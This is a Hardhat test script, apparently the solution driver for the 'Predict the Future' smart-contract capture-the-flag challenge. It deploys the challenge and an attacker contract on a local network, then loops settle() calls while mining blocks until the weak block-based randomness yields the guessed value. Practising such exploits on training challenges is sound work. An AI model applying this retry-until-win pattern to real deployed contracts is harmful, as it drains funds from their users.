import { time, loadFixture } from '@nomicfoundation/hardhat-network-helpers';
import { anyValue } from '@nomicfoundation/hardhat-chai-matchers/withArgs';
import { expect } from 'chai';
import { ethers, network } from 'hardhat';

describe('Start Point', async function () {
  async function setup() {
    const [owner, attackerWallet] = await ethers.getSigners();
    const predictTheFutureChallengeFactory = await ethers.getContractFactory(
      'PredictTheFutureChallenge'
    );
    const predictTheFutureAttackerFactory = await ethers.getContractFactory(
      'PredictTheFutureAttacker'
    );

    const predictTheFutureChallengeContract =
      await predictTheFutureChallengeFactory.deploy({
        value: ethers.utils.parseEther('1'),
      });

    const predictTheFutureAttackerContract =
      await predictTheFutureAttackerFactory.deploy(
        predictTheFutureChallengeContract.address
      );

    return {
      predictTheFutureChallengeContract,
      predictTheFutureAttackerContract,
      attackerWallet,
    };
  }

  describe('exploit', async function () {
    let predictTheFutureChallengeContract: any,
      predictTheFutureAttackerContract: any,
      attackerWallet;

    before(async function () {
      ({
        predictTheFutureChallengeContract,
        predictTheFutureAttackerContract,
        attackerWallet,
      } = await loadFixture(setup));
    });

    it('Should call the attack method', async function () {
      await predictTheFutureAttackerContract.lockInGuess(0, {
        value: ethers.utils.parseEther('1'),
      });

      do {
        await predictTheFutureAttackerContract.settle();

        await network.provider.send('evm_increaseTime', [10 * 60]);
        await network.provider.send('evm_mine');
      } while (!(await predictTheFutureChallengeContract.isComplete()));

      expect(await predictTheFutureChallengeContract.isComplete()).to.equal(
        true
      );
    });
  });
});
